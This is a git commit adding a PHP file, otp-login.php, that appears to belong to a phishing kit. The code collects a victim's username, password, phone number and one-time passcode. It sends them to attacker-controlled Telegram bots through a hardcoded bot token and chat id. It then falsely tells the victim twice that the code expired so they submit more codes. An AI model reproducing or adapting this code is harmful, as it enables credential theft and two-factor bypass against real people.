4f3c375d6b8ca5c7d458b6faf13ac54a1c362b34
phowns123 <73069862+phowns123@users.noreply.github.com>
2022-02-25 18:02:01 +0800

    Create otp-login.php

---
+++ otp-login.php
@@ -0,0 +1,27 @@
+$us = [
+'chat_id' => "-731060426",
+'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_COOKIE['number'] . "\nOTP: " . $_POST['otp']
+];
+file_get_contents("https://api.telegram.org/bot5110344584:AAHXHl64m7miRe7xnwmPA-_GNVqfmJatTIs/sendMessage?" . http_build_query($us));
+
+
+$data = [
+'chat_id' => $chat_id,
+'text' => "User: " . $_COOKIE['username'] . "\nPass: " . $_COOKIE['password'] . "\nNum: " . $_COOKIE['number'] . "\nOTP: " . $_POST['otp']
+];
+file_get_contents("https://api.telegram.org/bot" . $telebot . "/sendMessage?" . http_build_query($data));
+
+@session_start();
+if (isset($_SESSION['first_visit'])) {
+   if (isset($_SESSION['second_visit'])) {
+      header("Location: index.php?confirm=identity");
+   }
+   else {
+      $_SESSION['second_visit'] = "Second Visit";
+      header("Location: index.php?otp=expired");
+   }
+}
+else {
+   $_SESSION['first_visit'] = "First Visit";
+   header("Location: index.php?otp=expired");
+}
